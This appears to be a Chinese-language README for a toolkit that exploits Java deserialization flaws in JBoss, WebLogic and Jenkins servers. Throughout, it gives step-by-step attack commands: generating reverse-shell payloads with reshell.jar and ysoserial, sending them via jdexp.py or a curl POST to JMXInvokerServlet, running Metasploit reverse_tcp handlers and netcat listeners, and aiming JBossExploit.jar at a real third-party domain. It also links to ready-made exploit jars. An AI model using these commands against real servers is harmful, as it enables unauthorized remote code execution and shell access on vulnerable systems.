## JavaDeserialization


 
用reshell.jar生成反弹shell的payload，然后jdexp.py执行。

```
▶ python jdexp.py -h
usage: jdexp.py [-h] [-jboss] [-weblogic] host port payload

……

positional arguments:
  host        remote domain/IP
  port        remote port
  payload     local payload file

optional arguments:
  -h, --help  show this help message and exit
  -jboss      hack jboss
  -weblogic   hack weblogic
```

```
example:

	▶ nc -vvlp 888
	▶ java -jar reshell.jar [ReverseIP] 888 /tmp/payload
	
	▶ python jdexp.py -weblogic [RemoteIP] 7001 /tmp/payload
	▶ python jdexp.py -jboss [RemoteIP] 80 /tmp/payload
```

###下面的不用管了，jdexp.py可以完美代替。 
--

###jboss：

#####一

```
▶ java -jar ysoserial-0.0.2-all.jar
Y SO SERIAL?  
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'  
    Available payload types:  
        CommonsCollections1 #jboss用這個我測試過一次可行  
        CommonsCollections2 #剩下的沒測試過  
        Groovy1  
        Spring1  

▶ java -jar ysoserial-0.0.2-all.jar CommonsCollections1 'command' >/tmp/payload
▶ curl --header 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue' --data-binary '@/tmp/payload' http://127.0.0.1:8080/invoker/JMXInvokerServlet
```

[ysoserial-0.0.2-all.jar](https://github.com/frohoff/ysoserial/releases)  

####二  
JBossExploit運行需要外網地址。  

session 1:

```
▶ssh kali
root@Kali:~# msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/shell/reverse_tcp
msf exploit(handler) > set LHOST 123.123.123.123
msf exploit(handler) > set LPORT 999
msf exploit(handler) > exploit
```

session 2:

```
▶ssh kali
root@Kali:~# java -jar JBossExploit.jar -lhost 123.123.123.123 -lport 999 -rhost baidu.com -rport 80 -srvport 4040
```

[JBossExploit](https://github.com/njfox/Java-Deserialization-Exploit)  

####三
可眎化Jboss執行命令並回顯工具：  
[JBOSS_EXP.jar](http://www.freebuf.com/tools/88908.html)


###weblogic：  

```
▶ javac -classpath commons-collections-3.2.jar Main.java
▶ java Main.class
```

Main.java的作用是生成一個從url下載jar包的payload，jar包執行反彈shell。  
已打包為weblogic.jar，iswin.jar下載地址為~~原作者提供~~我的地址，有需要重新編譯源碼替換class就好啦。   
~~替換成[github](https://github.com/hackzx/JavaDeserialization/raw/master/iswin.jar)的jar。~~測試不能。

```
usage:  
  java -jar weblogic.jar [ip/domain] [port] [out_payload_file]

```

```
▶ java -jar weblogic.jar [ReverseIP] 888 /tmp/payload
▶ python weblogic.py [TargetIP] 7001 /tmp/payload
▶ ssh kali
root@Kali:~# nc -vv -l -p 888
```

[weblogic.jar](https://github.com/hackzx/JavaDeserialization/raw/master/weblogic.jar)  
[commons-collections-3.2.jar](http://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.2.zip "Main.jar依賴包")  
[Main.java](http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/ "TransformedMap的实现方式")  
[weblogic.py](https://github.com/schinkelg/JavaUnserializeExploits/blob/master/weblogic.py "自動添加包頭的修正腳本")

###jenkins

https://github.com/CaledoniaProject/jenkins-cli-exploit  


--

更多更多的鏈接：  
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/  
http://www.secpulse.com/archives/40420.html  
http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/  
https://github.com/foxglovesec/JavaUnserializeExploits  
https://github.com/njfox/Java-Deserialization-Exploit  
http://zone.wooyun.org/content/23905  